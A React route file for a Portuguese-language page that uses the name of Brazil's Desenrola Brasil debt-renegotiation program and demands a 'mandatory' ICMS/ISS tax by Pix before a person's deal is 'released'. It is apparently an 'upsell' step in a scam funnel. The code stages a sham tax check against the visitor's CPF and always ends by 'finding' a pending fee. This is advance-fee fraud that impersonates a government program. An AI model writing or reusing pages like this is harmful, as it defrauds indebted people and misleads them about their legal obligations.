import { createFileRoute } from "@tanstack/react-router";

import { UpsellPage } from "@/components/UpsellPage";
import { UPSELLS } from "@/lib/upsell-config";

export const Route = createFileRoute("/icms")({
  head: () => ({
    meta: [
      { title: "Desenrola Brasil — Taxa de ICMS/ISS" },
      {
        name: "description",
        content:
          "Finalize o pagamento da Taxa de ICMS/ISS via Pix para continuar com a liberação do seu acordo Desenrola Brasil.",
      },
      { property: "og:title", content: "Desenrola Brasil — Taxa de ICMS/ISS" },
      {
        property: "og:description",
        content:
          "Pague a Taxa de ICMS/ISS via Pix e continue com a liberação do seu acordo de renegociação.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Icms,
});

function Icms() {
  return (
    <UpsellPage
      config={UPSELLS.icms}
      copy={{
        headline: (
          <>
            <b>TAXA OBRIGATÓRIA</b> — Para continuar, é necessário quitar a <b>Taxa de ICMS/ISS</b> referente ao acordo
          </>
        ),
        startLabel: "Continuar",
        steps: [
          "Consultando tributos federais vinculados ao CPF...",
          "Calculando ICMS/ISS sobre o valor do acordo...",
          "Taxa pendente de quitação identificada!",
          "Dados tributários validados com sucesso!",
        ],
        offer: (
          <>
            Identificamos a <b>Taxa de ICMS/ISS</b> referente à quitação do seu acordo. É necessário pagar esse tributo
            para prosseguir com a liberação dos benefícios.
          </>
        ),
        payLabel: "Pagar Taxa de ICMS/ISS",
        footerNote:
          "A quitação dos tributos é obrigatória para a formalização do acordo Desenrola Brasil e liberação dos benefícios.",
      }}
    />
  );
}
